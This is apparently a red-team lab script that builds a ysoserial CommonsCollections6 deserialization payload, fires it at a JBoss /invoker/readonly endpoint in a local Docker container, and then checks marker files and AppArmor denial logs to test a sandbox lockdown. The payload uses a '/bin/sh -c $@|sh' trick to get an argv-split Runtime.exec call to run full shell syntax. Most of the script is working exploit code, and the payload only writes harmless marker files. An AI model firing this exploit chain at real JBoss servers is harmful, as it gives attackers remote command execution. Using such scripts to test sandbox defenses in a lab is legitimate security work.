# -*- coding: utf-8 -*-
"""RT5-A JBoss: app-tree write via GRANTED /bin/sh builtin redirect (no touch/curl).
   CC6 -> Runtime.exec(argv): ["/bin/sh","-c","$@|sh",".","printf",...]
   Inner sh re-parses full syntax: builtin printf + `>` redirect.
   1) write app tree marker  (expect SUCCESS -> criterion (c), new mechanism)
   2) write /tmp probe       (expect kernel DENY -> /tmp lockdown write-mask evidence)
"""
import os
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, ".."))
from common import gen_yso, session  # noqa: E402

OUT = os.path.join(HERE, "out")
os.makedirs(OUT, exist_ok=True)

CMD = ("/bin/sh -c $@|sh . printf rt5_sh_builtin_app > /jboss-6.1.0.Final/rt5_sh_marker "
       "; printf rt5_sh_tmp_try > /tmp/rt5_sh_tmp")

ser = gen_yso("CommonsCollections6", CMD, os.path.join(OUT, "rt5_jboss_sh.ser"))
print("[+] payload: %s (%d bytes)" % (ser, os.path.getsize(ser)))

s = session()
data = open(ser, "rb").read()
r = s.post("http://127.0.0.1:18080/invoker/readonly", data=data,
           headers={"Host": "evil.com", "Content-Type": "application/x-www-form-urlencoded"},
           timeout=30)
print("[*] fired -> HTTP %s (%dB)" % (r.status_code, len(r.content)))

print("\n=== truth: app-tree marker (expect EXISTS) ===")
r = subprocess.run(["docker", "exec", "multi-round-lab-jboss-1", "ls", "-l", "--full-time",
                    "/jboss-6.1.0.Final/rt5_sh_marker"], capture_output=True, text=True)
print((r.stdout + r.stderr).strip())
r = subprocess.run(["docker", "exec", "multi-round-lab-jboss-1", "cat",
                    "/jboss-6.1.0.Final/rt5_sh_marker"], capture_output=True, text=True)
print("content: %r" % r.stdout)

print("=== truth: /tmp probe (expect ABSENT) ===")
r = subprocess.run(["docker", "exec", "multi-round-lab-jboss-1", "ls", "-l", "--full-time",
                    "/tmp/rt5_sh_tmp"], capture_output=True, text=True)
print((r.stdout + r.stderr).strip())

print("=== audit (new DENIED, aa-jboss) ===")
r = subprocess.run(["wsl", "-u", "root", "--", "bash", "-c",
                    "dmesg | grep 'apparmor=\"DENIED\"' | grep 'aa-jboss' | tail -6"],
                   capture_output=True, text=True)
print(r.stdout + r.stderr)
